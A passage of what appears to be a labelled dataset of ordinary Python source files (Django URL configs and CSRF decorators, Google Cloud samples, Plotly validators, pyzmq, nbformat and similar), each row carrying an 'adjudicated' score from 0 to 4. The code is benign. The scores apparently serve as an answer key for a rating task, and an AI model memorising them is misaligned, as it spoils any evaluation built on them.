namespace='social')),<<NEWL>>]<<NEWL>><<NEWL>>if settings.DEBUG:<<NEWL>>    urlpatterns += static(settings.MEDIA_URL,document_root=settings.MEDIA_ROOT)"
102	adjudicated	3	"# This is an example of a service hosted by python.exe rather than<<NEWL>># pythonservice.exe.<<NEWL>><<NEWL>># Note that it is very rare that using python.exe is a better option<<NEWL>># than the default pythonservice.exe - the latter has better error handling<<NEWL>># so that if Python itself can't be initialized or there are very early<<NEWL>># import errors, you will get error details written to the event log.  When<<NEWL>># using python.exe instead, you are forced to wait for the interpreter startup<<NEWL>># and imports to succeed before you are able to effectively setup your own<<NEWL>># error handling.<<NEWL>><<NEWL>># So in short, please make sure you *really* want to do this, otherwise just<<NEWL>># stick with the default.<<NEWL>><<NEWL>>import sys<<NEWL>>import os<<NEWL>>import win32serviceutil<<NEWL>>import servicemanager<<NEWL>><<NEWL>>from pipeTestService import TestPipeService<<NEWL>><<NEWL>><<NEWL>>class NativeTestPipeService(TestPipeService):<<NEWL>>    _svc_name_ = ""PyNativePipeTestService""<<NEWL>>    _svc_display_name_ = ""Python Native Pipe Test Service""<<NEWL>>    _svc_description_ = ""Tests Python.exe hosted services""<<NEWL>>    # tell win32serviceutil we have a custom executable and custom args<<NEWL>>    # so registration does the right thing.<<NEWL>>    _exe_name_ = sys.executable<<NEWL>>    _exe_args_ = '""' + os.path.abspath(sys.argv[0]) + '""'<<NEWL>><<NEWL>><<NEWL>>def main():<<NEWL>>    if len(sys.argv) == 1:<<NEWL>>        # service must be starting...<<NEWL>>        # for the sake of debugging etc, we use win32traceutil to see<<NEWL>>        # any unhandled exceptions and print statements.<<NEWL>>        import win32traceutil<<NEWL>><<NEWL>>        print(""service is starting..."")<<NEWL>>        print(""(execute this script with '--help' if that isn't what you want)"")<<NEWL>><<NEWL>>        servicemanager.Initialize()<<NEWL>>        servicemanager.PrepareToHostSingle(NativeTestPipeService)<<NEWL>>        # Now ask the service manager to fire things up for us...<<NEWL>>        servicemanager.StartServiceCtrlDispatcher()<<NEWL>>        print(""service done!"")<<NEWL>>    else:<<NEWL>>        win32serviceutil.HandleCommandLine(NativeTestPipeService)<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    try:<<NEWL>>        main()<<NEWL>>    except (SystemExit, KeyboardInterrupt):<<NEWL>>        raise<<NEWL>>    except:<<NEWL>>        print(""Something went bad!"")<<NEWL>>        import traceback<<NEWL>><<NEWL>>        traceback.print_exc()"
42	adjudicated	3	"# Copyright 2020 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     https://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>># [START vision_async_batch_annotate_images]<<NEWL>><<NEWL>>from google.cloud import vision_v1<<NEWL>><<NEWL>><<NEWL>>def sample_async_batch_annotate_images(<<NEWL>>    input_image_uri=""gs://cloud-samples-data/vision/label/wakeupcat.jpg"",<<NEWL>>    output_uri=""gs://your-bucket/prefix/"",<<NEWL>>):<<NEWL>>    """"""Perform async batch image annotation.""""""<<NEWL>>    client = vision_v1.ImageAnnotatorClient()<<NEWL>><<NEWL>>    source = {""image_uri"": input_image_uri}<<NEWL>>    image = {""source"": source}<<NEWL>>    features = [<<NEWL>>        {""type_"": vision_v1.Feature.Type.LABEL_DETECTION},<<NEWL>>        {""type_"": vision_v1.Feature.Type.IMAGE_PROPERTIES},<<NEWL>>    ]<<NEWL>><<NEWL>>    # Each requests element corresponds to a single image.  To annotate more<<NEWL>>    # images, create a request element for each image and add it to<<NEWL>>    # the array of requests<<NEWL>>    requests = [{""image"": image, ""features"": features}]<<NEWL>>    gcs_destination = {""uri"": output_uri}<<NEWL>><<NEWL>>    # The max number of responses to output in each JSON file<<NEWL>>    batch_size = 2<<NEWL>>    output_config = {""gcs_destination"": gcs_destination,<<NEWL>>                     ""batch_size"": batch_size}<<NEWL>><<NEWL>>    operation = client.async_batch_annotate_images(requests=requests, output_config=output_config)<<NEWL>><<NEWL>>    print(""Waiting for operation to complete..."")<<NEWL>>    response = operation.result(90)<<NEWL>><<NEWL>>    # The output is written to GCS with the provided output_uri as prefix<<NEWL>>    gcs_output_uri = response.output_config.gcs_destination.uri<<NEWL>>    print(""Output written to GCS with prefix: {}"".format(gcs_output_uri))<<NEWL>><<NEWL>><<NEWL>># [END vision_async_batch_annotate_images]"
153	adjudicated	0	"import datetime<<NEWL>>import time<<NEWL>><<NEWL>>from telegramfeed import interfaces, repositories, services<<NEWL>><<NEWL>><<NEWL>>class FeederService:<<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        chat_interface: interfaces.ChatInterface,<<NEWL>>        subscription_repo: repositories.SubscriptionRepo,<<NEWL>>        feed_downloader_service: services.FeedDownloaderService,<<NEWL>>    ):<<NEWL>>        self.chat_interface = chat_interface<<NEWL>>        self.subscription_repo = subscription_repo<<NEWL>>        self.feed_downloader_service = feed_downloader_service<<NEWL>><<NEWL>>    def start(self):<<NEWL>>        print(""Processing feeds"")<<NEWL>>        self.process_feeds()<<NEWL>><<NEWL>>    def process_feeds(self):<<NEWL>>        subscriptions = self.subscription_repo.fetch_all()<<NEWL>>        for subscription in subscriptions:<<NEWL>>            print(<<NEWL>>                f""Processing subscription {subscription.feed_url} for user {subscription.user_id}""<<NEWL>>            )<<NEWL>>            self._manage_subscription(subscription)<<NEWL>><<NEWL>>    def _manage_subscription(self, subscription):<<NEWL>>        feed_content = self.feed_downloader_service.download(subscription.feed_url)<<NEWL>><<NEWL>>        if ""entries"" not in feed_content.keys():<<NEWL>>            return<<NEWL>><<NEWL>>        for entry in feed_content[""entries""]:<<NEWL>>            self._manage_entry(subscription, entry)<<NEWL>><<NEWL>>        self._subscription_update_check(subscription)<<NEWL>><<NEWL>>    def _subscription_update_check(self, subscription):<<NEWL>>        subscription.last_check = datetime.datetime.now()<<NEWL>>        self.subscription_repo.update(subscription)<<NEWL>><<NEWL>>    def _manage_entry(self, subscription, entry):<<NEWL>>        updated_parsed = datetime.datetime.fromtimestamp(<<NEWL>>            time.mktime(entry[""updated_parsed""])<<NEWL>>        )<<NEWL>>        if subscription.last_check < updated_parsed:<<NEWL>>            self.send_entry(subscription, entry)<<NEWL>><<NEWL>>    def send_entry(self, subscription, entry):<<NEWL>>        try:<<NEWL>>            self.chat_interface.send_message(subscription.user_id, entry[""link""])<<NEWL>>        except Exception as e:<<NEWL>>            print(f""Error sending message: {e}"")"
382	adjudicated	2	"def _fix_contents(filename, contents):<<NEWL>>    import re<<NEWL>><<NEWL>>    contents = re.sub(<<NEWL>>        r""from bytecode"", r'from _pydevd_frame_eval.vendored.bytecode', contents, flags=re.MULTILINE<<NEWL>>    )<<NEWL>><<NEWL>>    contents = re.sub(<<NEWL>>        r""import bytecode"", r'from _pydevd_frame_eval.vendored import bytecode', contents, flags=re.MULTILINE<<NEWL>>    )<<NEWL>><<NEWL>>    # This test will import the wrong setup (we're not interested in it).<<NEWL>>    contents = re.sub(<<NEWL>>        r""def test_version\(self\):"", r'def skip_test_version(self):', contents, flags=re.MULTILINE<<NEWL>>    )<<NEWL>><<NEWL>>    if filename.startswith('test_'):<<NEWL>>        if 'pytestmark' not in contents:<<NEWL>>            pytest_mark = '''<<NEWL>>import pytest<<NEWL>>from tests_python.debugger_unittest import IS_PY36_OR_GREATER, IS_CPYTHON<<NEWL>>from tests_python.debug_constants import TEST_CYTHON<<NEWL>>pytestmark = pytest.mark.skipif(not IS_PY36_OR_GREATER or not IS_CPYTHON or not TEST_CYTHON, reason='Requires CPython >= 3.6')<<NEWL>>'''<<NEWL>>            contents = pytest_mark + contents<<NEWL>>    return contents<<NEWL>><<NEWL>><<NEWL>>def main():<<NEWL>>    import os<<NEWL>><<NEWL>>    # traverse root directory, and list directories as dirs and files as files<<NEWL>>    for root, dirs, files in os.walk(os.path.dirname(__file__)):<<NEWL>>        path = root.split(os.sep)<<NEWL>>        for filename in files:<<NEWL>>            if filename.endswith('.py') and filename != 'pydevd_fix_code.py':<<NEWL>>                with open(os.path.join(root, filename), 'r') as stream:<<NEWL>>                    contents = stream.read()<<NEWL>><<NEWL>>                new_contents = _fix_contents(filename, contents)<<NEWL>>                if contents != new_contents:<<NEWL>>                    print('fixed ', os.path.join(root, filename))<<NEWL>>                    with open(os.path.join(root, filename), 'w') as stream:<<NEWL>>                        stream.write(new_contents)<<NEWL>><<NEWL>>#             print(len(path) * '---', filename)<<NEWL>><<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>    main()"
13	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""choropleth.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
231	adjudicated	4	"""""""Latex filters.<<NEWL>><<NEWL>>Module of useful filters for processing Latex within Jinja latex templates.<<NEWL>>""""""<<NEWL>># -----------------------------------------------------------------------------<<NEWL>># Copyright (c) 2013, the IPython Development Team.<<NEWL>>#<<NEWL>># Distributed under the terms of the Modified BSD License.<<NEWL>>#<<NEWL>># The full license is in the file COPYING.txt, distributed with this software.<<NEWL>># -----------------------------------------------------------------------------<<NEWL>><<NEWL>># -----------------------------------------------------------------------------<<NEWL>># Imports<<NEWL>># -----------------------------------------------------------------------------<<NEWL>>import re<<NEWL>><<NEWL>># -----------------------------------------------------------------------------<<NEWL>># Globals and constants<<NEWL>># -----------------------------------------------------------------------------<<NEWL>><<NEWL>>LATEX_RE_SUBS = ((re.compile(r""\.\.\.+""), r""{\\ldots}""),)<<NEWL>><<NEWL>># Latex substitutions for escaping latex.<<NEWL>># see: http://stackoverflow.com/questions/16259923/how-can-i-escape-latex-special-characters-inside-django-templates<<NEWL>><<NEWL>>LATEX_SUBS = {<<NEWL>>    ""&"": r""\&"",<<NEWL>>    ""%"": r""\%"",<<NEWL>>    ""$"": r""\$"",<<NEWL>>    ""#"": r""\#"",<<NEWL>>    ""_"": r""\_"",<<NEWL>>    ""{"": r""\{"",<<NEWL>>    ""}"": r""\}"",<<NEWL>>    ""~"": r""\textasciitilde{}"",<<NEWL>>    ""^"": r""\^{}"",<<NEWL>>    ""\\"": r""\textbackslash{}"",<<NEWL>>}<<NEWL>><<NEWL>><<NEWL>># -----------------------------------------------------------------------------<<NEWL>># Functions<<NEWL>># -----------------------------------------------------------------------------<<NEWL>><<NEWL>>__all__ = [""escape_latex""]<<NEWL>><<NEWL>><<NEWL>>def escape_latex(text):<<NEWL>>    """"""<<NEWL>>    Escape characters that may conflict with latex.<<NEWL>><<NEWL>>    Parameters<<NEWL>>    ----------<<NEWL>>    text : str<<NEWL>>        Text containing characters that may conflict with Latex<<NEWL>>    """"""<<NEWL>>    text = """".join(LATEX_SUBS.get(c, c) for c in text)<<NEWL>>    for pattern, replacement in LATEX_RE_SUBS:<<NEWL>>        text = pattern.sub(replacement, text)<<NEWL>><<NEWL>>    return text"
371	adjudicated	3	"from functools import wraps<<NEWL>><<NEWL>>from django.middleware.csrf import CsrfViewMiddleware, get_token<<NEWL>>from django.utils.decorators import decorator_from_middleware<<NEWL>><<NEWL>>csrf_protect = decorator_from_middleware(CsrfViewMiddleware)<<NEWL>>csrf_protect.__name__ = ""csrf_protect""<<NEWL>>csrf_protect.__doc__ = """"""<<NEWL>>This decorator adds CSRF protection in exactly the same way as<<NEWL>>CsrfViewMiddleware, but it can be used on a per view basis.  Using both, or<<NEWL>>using the decorator multiple times, is harmless and efficient.<<NEWL>>""""""<<NEWL>><<NEWL>><<NEWL>>class _EnsureCsrfToken(CsrfViewMiddleware):<<NEWL>>    # Behave like CsrfViewMiddleware but don't reject requests or log warnings.<<NEWL>>    def _reject(self, request, reason):<<NEWL>>        return None<<NEWL>><<NEWL>><<NEWL>>requires_csrf_token = decorator_from_middleware(_EnsureCsrfToken)<<NEWL>>requires_csrf_token.__name__ = 'requires_csrf_token'<<NEWL>>requires_csrf_token.__doc__ = """"""<<NEWL>>Use this decorator on views that need a correct csrf_token available to<<NEWL>>RequestContext, but without the CSRF protection that csrf_protect<<NEWL>>enforces.<<NEWL>>""""""<<NEWL>><<NEWL>><<NEWL>>class _EnsureCsrfCookie(CsrfViewMiddleware):<<NEWL>>    def _reject(self, request, reason):<<NEWL>>        return None<<NEWL>><<NEWL>>    def process_view(self, request, callback, callback_args, callback_kwargs):<<NEWL>>        retval = super().process_view(request, callback, callback_args, callback_kwargs)<<NEWL>>        # Force process_response to send the cookie<<NEWL>>        get_token(request)<<NEWL>>        return retval<<NEWL>><<NEWL>><<NEWL>>ensure_csrf_cookie = decorator_from_middleware(_EnsureCsrfCookie)<<NEWL>>ensure_csrf_cookie.__name__ = 'ensure_csrf_cookie'<<NEWL>>ensure_csrf_cookie.__doc__ = """"""<<NEWL>>Use this decorator to ensure that a view sets a CSRF cookie, whether or not it<<NEWL>>uses the csrf_token template tag, or the CsrfViewMiddleware is used.<<NEWL>>""""""<<NEWL>><<NEWL>><<NEWL>>def csrf_exempt(view_func):<<NEWL>>    """"""Mark a view function as being exempt from the CSRF view protection.""""""<<NEWL>>    # view_func.csrf_exempt = True would also work, but decorators are nicer<<NEWL>>    # if they don't have side effects, so return a new function.<<NEWL>>    def wrapped_view(*args, **kwargs):<<NEWL>>        return view_func(*args, **kwargs)<<NEWL>>    wrapped_view.csrf_exempt = True<<NEWL>>    return wraps(view_func)(wrapped_view)"
260	adjudicated	0	"# -*- coding: utf-8 -*-<<NEWL>># Generated by the protocol buffer compiler.  DO NOT EDIT!<<NEWL>># source: streamlit/proto/PageNotFound.proto<<NEWL>><<NEWL>>from google.protobuf import descriptor as _descriptor<<NEWL>>from google.protobuf import message as _message<<NEWL>>from google.protobuf import reflection as _reflection<<NEWL>>from google.protobuf import symbol_database as _symbol_database<<NEWL>># @@protoc_insertion_point(imports)<<NEWL>><<NEWL>>_sym_db = _symbol_database.Default()<<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>>DESCRIPTOR = _descriptor.FileDescriptor(<<NEWL>>  name='streamlit/proto/PageNotFound.proto',<<NEWL>>  package='',<<NEWL>>  syntax='proto3',<<NEWL>>  serialized_options=None,<<NEWL>>  create_key=_descriptor._internal_create_key,<<NEWL>>  serialized_pb=b'\n\""streamlit/proto/PageNotFound.proto\""!\n\x0cPageNotFound\x12\x11\n\tpage_name\x18\x01 \x01(\tb\x06proto3'<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>>_PAGENOTFOUND = _descriptor.Descriptor(<<NEWL>>  name='PageNotFound',<<NEWL>>  full_name='PageNotFound',<<NEWL>>  filename=None,<<NEWL>>  file=DESCRIPTOR,<<NEWL>>  containing_type=None,<<NEWL>>  create_key=_descriptor._internal_create_key,<<NEWL>>  fields=[<<NEWL>>    _descriptor.FieldDescriptor(<<NEWL>>      name='page_name', full_name='PageNotFound.page_name', index=0,<<NEWL>>      number=1, type=9, cpp_type=9, label=1,<<NEWL>>      has_default_value=False, default_value=b"""".decode('utf-8'),<<NEWL>>      message_type=None, enum_type=None, containing_type=None,<<NEWL>>      is_extension=False, extension_scope=None,<<NEWL>>      serialized_options=None, file=DESCRIPTOR,  create_key=_descriptor._internal_create_key),<<NEWL>>  ],<<NEWL>>  extensions=[<<NEWL>>  ],<<NEWL>>  nested_types=[],<<NEWL>>  enum_types=[<<NEWL>>  ],<<NEWL>>  serialized_options=None,<<NEWL>>  is_extendable=False,<<NEWL>>  syntax='proto3',<<NEWL>>  extension_ranges=[],<<NEWL>>  oneofs=[<<NEWL>>  ],<<NEWL>>  serialized_start=38,<<NEWL>>  serialized_end=71,<<NEWL>>)<<NEWL>><<NEWL>>DESCRIPTOR.message_types_by_name['PageNotFound'] = _PAGENOTFOUND<<NEWL>>_sym_db.RegisterFileDescriptor(DESCRIPTOR)<<NEWL>><<NEWL>>PageNotFound = _reflection.GeneratedProtocolMessageType('PageNotFound', (_message.Message,), {<<NEWL>>  'DESCRIPTOR' : _PAGENOTFOUND,<<NEWL>>  '__module__' : 'streamlit.proto.PageNotFound_pb2'<<NEWL>>  # @@protoc_insertion_point(class_scope:PageNotFound)<<NEWL>>  })<<NEWL>>_sym_db.RegisterMessage(PageNotFound)<<NEWL>><<NEWL>><<NEWL>># @@protoc_insertion_point(module_scope)"
240	adjudicated	4	"""""""MonitoredQueue classes and functions.""""""<<NEWL>><<NEWL>># Copyright (C) PyZMQ Developers<<NEWL>># Distributed under the terms of the Modified BSD License.<<NEWL>><<NEWL>><<NEWL>>from zmq import PUB<<NEWL>>from zmq.devices.monitoredqueue import monitored_queue<<NEWL>>from zmq.devices.proxydevice import ProcessProxy, Proxy, ProxyBase, ThreadProxy<<NEWL>><<NEWL>><<NEWL>>class MonitoredQueueBase(ProxyBase):<<NEWL>>    """"""Base class for overriding methods.""""""<<NEWL>><<NEWL>>    _in_prefix = b''<<NEWL>>    _out_prefix = b''<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self, in_type, out_type, mon_type=PUB, in_prefix=b'in', out_prefix=b'out'<<NEWL>>    ):<<NEWL>><<NEWL>>        ProxyBase.__init__(self, in_type=in_type, out_type=out_type, mon_type=mon_type)<<NEWL>><<NEWL>>        self._in_prefix = in_prefix<<NEWL>>        self._out_prefix = out_prefix<<NEWL>><<NEWL>>    def run_device(self):<<NEWL>>        ins, outs, mons = self._setup_sockets()<<NEWL>>        monitored_queue(ins, outs, mons, self._in_prefix, self._out_prefix)<<NEWL>><<NEWL>><<NEWL>>class MonitoredQueue(MonitoredQueueBase, Proxy):<<NEWL>>    """"""Class for running monitored_queue in the background.<<NEWL>><<NEWL>>    See zmq.devices.Device for most of the spec. MonitoredQueue differs from Proxy,<<NEWL>>    only in that it adds a ``prefix`` to messages sent on the monitor socket,<<NEWL>>    with a different prefix for each direction.<<NEWL>><<NEWL>>    MQ also supports ROUTER on both sides, which zmq.proxy does not.<<NEWL>><<NEWL>>    If a message arrives on `in_sock`, it will be prefixed with `in_prefix` on the monitor socket.<<NEWL>>    If it arrives on out_sock, it will be prefixed with `out_prefix`.<<NEWL>><<NEWL>>    A PUB socket is the most logical choice for the mon_socket, but it is not required.<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class ThreadMonitoredQueue(MonitoredQueueBase, ThreadProxy):<<NEWL>>    """"""Run zmq.monitored_queue in a background thread.<<NEWL>><<NEWL>>    See MonitoredQueue and Proxy for details.<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class ProcessMonitoredQueue(MonitoredQueueBase, ProcessProxy):<<NEWL>>    """"""Run zmq.monitored_queue in a separate process.<<NEWL>><<NEWL>>    See MonitoredQueue and Proxy for details.<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>__all__ = ['MonitoredQueue', 'ThreadMonitoredQueue', 'ProcessMonitoredQueue']"
300	adjudicated	1	"# Copyright 2020 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#    http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>><<NEWL>># [START automl_batch_predict_beta]<<NEWL>>from google.cloud import automl_v1beta1 as automl<<NEWL>><<NEWL>><<NEWL>>def batch_predict(<<NEWL>>    project_id=""YOUR_PROJECT_ID"",<<NEWL>>    model_id=""YOUR_MODEL_ID"",<<NEWL>>    input_uri=""gs://YOUR_BUCKET_ID/path/to/your/input/csv_or_jsonl"",<<NEWL>>    output_uri=""gs://YOUR_BUCKET_ID/path/to/save/results/"",<<NEWL>>):<<NEWL>>    """"""Batch predict""""""<<NEWL>>    prediction_client = automl.PredictionServiceClient()<<NEWL>><<NEWL>>    # Get the full path of the model.<<NEWL>>    model_full_id = automl.AutoMlClient.model_path(<<NEWL>>        project_id, ""us-central1"", model_id<<NEWL>>    )<<NEWL>><<NEWL>>    gcs_source = automl.GcsSource(input_uris=[input_uri])<<NEWL>><<NEWL>>    input_config = automl.BatchPredictInputConfig(gcs_source=gcs_source)<<NEWL>>    gcs_destination = automl.GcsDestination(output_uri_prefix=output_uri)<<NEWL>>    output_config = automl.BatchPredictOutputConfig(<<NEWL>>        gcs_destination=gcs_destination<<NEWL>>    )<<NEWL>>    params = {}<<NEWL>><<NEWL>>    request = automl.BatchPredictRequest(<<NEWL>>        name=model_full_id,<<NEWL>>        input_config=input_config,<<NEWL>>        output_config=output_config,<<NEWL>>        params=params<<NEWL>>    )<<NEWL>>    response = prediction_client.batch_predict(<<NEWL>>        request=request<<NEWL>>    )<<NEWL>><<NEWL>>    print(""Waiting for operation to complete..."")<<NEWL>>    print(<<NEWL>>        ""Batch Prediction results saved to Cloud Storage bucket. {}"".format(<<NEWL>>            response.result()<<NEWL>>        )<<NEWL>>    )<<NEWL>># [END automl_batch_predict_beta]"
91	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""font"", parent_name=""funnel.hoverlabel"", **kwargs):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
211	adjudicated	2	"""""""Read and write notebooks in JSON format.""""""<<NEWL>><<NEWL>># Copyright (c) IPython Development Team.<<NEWL>># Distributed under the terms of the Modified BSD License.<<NEWL>><<NEWL>>import copy<<NEWL>>import json<<NEWL>><<NEWL>>from ..notebooknode import from_dict<<NEWL>>from .rwbase import (<<NEWL>>    NotebookReader,<<NEWL>>    NotebookWriter,<<NEWL>>    rejoin_lines,<<NEWL>>    split_lines,<<NEWL>>    strip_transient,<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>class BytesEncoder(json.JSONEncoder):<<NEWL>>    """"""A JSON encoder that accepts b64 (and other *ascii*) bytestrings.""""""<<NEWL>><<NEWL>>    def default(self, obj):<<NEWL>>        if isinstance(obj, bytes):<<NEWL>>            return obj.decode(""ascii"")<<NEWL>>        return json.JSONEncoder.default(self, obj)<<NEWL>><<NEWL>><<NEWL>>class JSONReader(NotebookReader):<<NEWL>>    def reads(self, s, **kwargs):<<NEWL>>        """"""Read a JSON string into a Notebook object""""""<<NEWL>>        nb = json.loads(s, **kwargs)<<NEWL>>        nb = self.to_notebook(nb, **kwargs)<<NEWL>>        return nb<<NEWL>><<NEWL>>    def to_notebook(self, d, **kwargs):<<NEWL>>        """"""Convert a disk-format notebook dict to in-memory NotebookNode<<NEWL>><<NEWL>>        handles multi-line values as strings, scrubbing of transient values, etc.<<NEWL>>        """"""<<NEWL>>        nb = from_dict(d)<<NEWL>>        nb = rejoin_lines(nb)<<NEWL>>        nb = strip_transient(nb)<<NEWL>>        return nb<<NEWL>><<NEWL>><<NEWL>>class JSONWriter(NotebookWriter):<<NEWL>>    def writes(self, nb, **kwargs):<<NEWL>>        """"""Serialize a NotebookNode object as a JSON string""""""<<NEWL>>        kwargs[""cls""] = BytesEncoder<<NEWL>>        kwargs[""indent""] = 1<<NEWL>>        kwargs[""sort_keys""] = True<<NEWL>>        kwargs[""separators""] = ("","", "": "")<<NEWL>>        kwargs.setdefault(""ensure_ascii"", False)<<NEWL>>        # don't modify in-memory dict<<NEWL>>        nb = copy.deepcopy(nb)<<NEWL>>        if kwargs.pop(""split_lines"", True):<<NEWL>>            nb = split_lines(nb)<<NEWL>>        nb = strip_transient(nb)<<NEWL>>        return json.dumps(nb, **kwargs)<<NEWL>><<NEWL>><<NEWL>>_reader = JSONReader()<<NEWL>>_writer = JSONWriter()<<NEWL>><<NEWL>>reads = _reader.reads<<NEWL>>read = _reader.read<<NEWL>>to_notebook = _reader.to_notebook<<NEWL>>write = _writer.write<<NEWL>>writes = _writer.writes"
180	adjudicated	1	"""""""BuildMyResume URL Configuration<<NEWL>><<NEWL>>The `urlpatterns` list routes URLs to views. <<NEWL>>""""""<<NEWL>>from django.contrib import admin<<NEWL>>from django.contrib.auth import views as auth_views<<NEWL>>from django.urls import path, include<<NEWL>>from django.conf.urls.static import static<<NEWL>>from django.conf import settings<<NEWL>><<NEWL>>from . import views<<NEWL>>from users import views as users_views<<NEWL>><<NEWL>>urlpatterns = [<<NEWL>>    path('admin/', admin.site.urls),<<NEWL>>    path('', views.home_view, name='home'),<<NEWL>><<NEWL>>    path('home/', include(('home.urls', 'home'), namespace='home')),<<NEWL>>    path('accounts/', include('allauth.urls')),<<NEWL>><<NEWL>>    path('signup/', users_views.signup, name='signup'),<<NEWL>>    path('activate/<uidb64>/<token>/', users_views.activate, name='activate'),<<NEWL>><<NEWL>>    path('login/', auth_views.LoginView.as_view(template_name='users/login.html'), name='login'),<<NEWL>>    path('logout/', auth_views.LogoutView.as_view(next_page='/accounts/login'), name='logout'),<<NEWL>>    path('password-reset/', auth_views.PasswordResetView.as_view(template_name='users/password_reset.html'), name='password_reset'),<<NEWL>>    path('password-reset/done/', auth_views.PasswordChangeDoneView.as_view(template_name='users/password_reset_done.html'), name='password_reset_done'),<<NEWL>>    path('password-reset-confirm/<uidb64>/<token>/', auth_views.PasswordResetConfirmView.as_view(template_name='users/password_reset_confirm.html'), name='password_reset_confirm'),<<NEWL>>    path('password-reset-complete/', auth_views.PasswordResetCompleteView.as_view(template_name='users/password_reset_complete.html'), name='password_reset_complete'),<<NEWL>><<NEWL>>    path('__debug__/', include('debug_toolbar.urls')),<<NEWL>><<NEWL>>]<<NEWL>>if settings.DEBUG:<<NEWL>>    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT) <<NEWL>>    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)"
